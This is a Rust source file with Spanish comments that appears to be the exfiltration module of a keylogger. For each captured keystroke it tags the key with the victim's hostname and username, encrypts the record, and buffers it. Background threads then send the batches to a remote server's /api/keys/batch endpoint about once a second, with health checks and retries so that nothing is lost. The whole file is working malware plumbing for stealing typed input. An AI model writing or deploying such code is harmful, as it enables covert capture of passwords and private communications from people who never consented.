use reqwest::blocking::Client;
use serde_json::json;
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};
use std::thread;
use crate::crypto;

/// Intervalo de envío en segundos (cada 30 segundos)
const SEND_INTERVAL_SECONDS: u64 = 1;

/// Tamaño máximo del buffer antes de enviar aunque no haya pasado el tiempo
const MAX_BUFFER_SIZE: usize = 1;

/// Tiempo de espera entre reintentos si la API no responde (en segundos)
const RETRY_INTERVAL_SECONDS: u64 = 10;

pub struct ApiClient {
    client: Client,
    base_url: String,
    buffer: Arc<Mutex<Vec<serde_json::Value>>>,
    api_available: Arc<Mutex<bool>>,
}

impl ApiClient {
    pub fn new(base_url: &str) -> Self {
        println!("🌐 ApiClient::new() - base_url: {}", base_url);

        let client = ApiClient {
            client: Client::new(),
            base_url: base_url.to_string(),
            buffer: Arc::new(Mutex::new(Vec::new())),
            api_available: Arc::new(Mutex::new(false)),
        };

        client.start_health_checker();
        client.start_periodic_sender();

        client
    }

    /// Verifica si la API está disponible
    fn check_api_health(&self) -> bool {
        let url = format!("{}/api/keys", self.base_url);
        match self.client.get(&url).send() {
            Ok(response) => response.status().is_success(),
            Err(_) => false,
        }
    }

    /// Hilo que verifica la salud de la API periódicamente
    fn start_health_checker(&self) {
        let client = self.clone();
        thread::spawn(move || {
            loop {
                let available = client.check_api_health();

                {
                    let mut status = client.api_available.lock().unwrap();
                    if available && !*status {
                        println!("✅ API disponible! Enviando buffer acumulado...");
                        *status = true;
                        drop(status);
                        let _ = client.flush();
                    } else if !available && *status {
                        println!("⚠️ API no disponible, esperando reconexión...");
                        *status = false;
                    } else if !available {
                        println!("⏳ API no disponible, reintentando en {} segundos...", RETRY_INTERVAL_SECONDS);
                    }
                }

                thread::sleep(Duration::from_secs(RETRY_INTERVAL_SECONDS));
            }
        });
    }

    /// Agrega una tecla al buffer (cifrada)
    pub fn add_key(&self, key: &str, timestamp: &str) -> Result<(), Box<dyn std::error::Error>> {
        println!("📝 add_key() - key: '{}'", key);

        let machine = hostname::get()?.to_string_lossy().to_string();
        let user = std::env::var("USER")
            .or_else(|_| std::env::var("USERNAME"))
            .unwrap_or_else(|_| "unknown".to_string());

        // 1. Crear el payload en texto plano
        let plaintext = json!({
            "key": key,
            "timestamp": timestamp,
            "machine": machine,
            "user": user,
        });

        // 2. Convertir a string y CIFRAR
        let plaintext_str = plaintext.to_string();
        println!("📝 Texto plano a cifrar: {}", plaintext_str);

        let encrypted = match crypto::encrypt(&plaintext_str) {
            Ok(e) => {
                println!("✅ Cifrado exitoso - longitud: {}", e.len());
                e
            }
            Err(e) => {
                eprintln!("❌ Error cifrando: {}", e);
                return Err(e);
            }
        };

        // 3. Guardar el dato cifrado en el buffer
        let entry = json!({ "data": encrypted });

        let mut buffer = self.buffer.lock().unwrap();
        buffer.push(entry);
        println!("📊 Buffer actual: {} teclas", buffer.len());

        let api_available = *self.api_available.lock().unwrap();
        if buffer.len() >= MAX_BUFFER_SIZE && api_available {
            drop(buffer);
            let _ = self.flush();
        }

        Ok(())
    }

    /// Envía todos los datos del buffer y lo vacía
    pub fn flush(&self) -> Result<(), Box<dyn std::error::Error>> {
        let mut buffer = self.buffer.lock().unwrap();

        if buffer.is_empty() {
            return Ok(());
        }

        let api_available = *self.api_available.lock().unwrap();
        if !api_available {
            println!("⏳ API no disponible, buffer retenido ({} teclas)", buffer.len());
            return Ok(());
        }

        // IMPORTANTE: Antes de enviar, mostramos lo que vamos a enviar
        let data: Vec<serde_json::Value> = buffer.drain(..).collect();
        let count = data.len();

        println!("📤 Enviando {} teclas cifradas al servidor...", count);
        println!("📤 Primera tecla cifrada: {}", data[0]["data"].as_str().unwrap_or("VACÍO"));

        let url = format!("{}/api/keys/batch", self.base_url);
        match self.client.post(&url).json(&data).send() {
            Ok(response) => {
                if response.status().is_success() {
                    println!("✅ {} teclas cifradas enviadas correctamente", count);
                } else {
                    eprintln!("⚠️ Error HTTP: {}", response.status());
                    for item in data {
                        buffer.push(item);
                    }
                }
            }
            Err(e) => {
                eprintln!("❌ Error enviando teclas: {}", e);
                for item in data {
                    buffer.push(item);
                }
                let mut status = self.api_available.lock().unwrap();
                *status = false;
            }
        }

        Ok(())
    }

    /// Inicia un hilo que envía el buffer periódicamente
    fn start_periodic_sender(&self) {
        let client = self.clone();
        thread::spawn(move || {
            let interval = Duration::from_secs(SEND_INTERVAL_SECONDS);
            let mut last_send = Instant::now();

            loop {
                thread::sleep(Duration::from_millis(1000));

                if last_send.elapsed() >= interval {
                    let _ = client.flush();
                    last_send = Instant::now();
                }
            }
        });
    }
}

impl Clone for ApiClient {
    fn clone(&self) -> Self {
        Self {
            client: self.client.clone(),
            base_url: self.base_url.clone(),
            buffer: Arc::clone(&self.buffer),
            api_available: Arc::clone(&self.api_available),
        }
    }
}
